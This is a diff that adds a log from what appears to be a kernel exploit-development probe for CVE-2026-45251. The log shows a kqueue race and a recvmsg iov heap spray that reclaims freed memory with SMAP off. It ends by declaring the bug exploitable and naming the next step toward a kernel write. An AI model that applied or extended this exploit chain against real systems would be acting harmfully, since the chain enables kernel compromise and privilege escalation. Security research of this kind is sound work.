@@ -1,0 +1,36 @@
+=== PROBE 500h: RECVMSG IOV SPRAY (CVE-2026-45251) ===
+
+pid=1455
+eboot=0x000000002E608000
+fake_mtx=0x00000003105EB160 (mtx_lock@+0x10=0x4)
+
+--- A: recvmsg blocking test ---
+  socketpair: rd=23 wr=24
+  unexpected marker=0
+  cleanup done, marker=0
+
+--- B: control race (no spray) ---
+  control 1: poll=0
+  control 2: poll=0
+
+--- C: kqueue race + recvmsg iov spray ---
+[iter 1/5]
+  kq_fd=23
+  spray children: 10/10
+  close done (marker=0)
+  spray running: 0/10
+  waiting for poll timeout (~3s)...
+  poll_rv=0 poll_done=true
+  fake_mtx.mtx_lock=0x0000000000000004 (4=untouched)
+  canary1 modified: 0xDEAD0001DEAD0000
+  canary2 modified: 0xDEAD0002DEAD0000
+=== RECLAIM CONFIRMED (SMAP OFF) ===
+
+========================================
+*** SPRAY RECLAIM CONFIRMED (SMAP OFF) ***
+*** CVE-2026-45251 IS EXPLOITABLE ***
+Next: forge si_mtx → controlled TAILQ_REMOVE → kernel write
+canary=1455
+========================================
+
+=== PROBE 500h COMPLETE ===
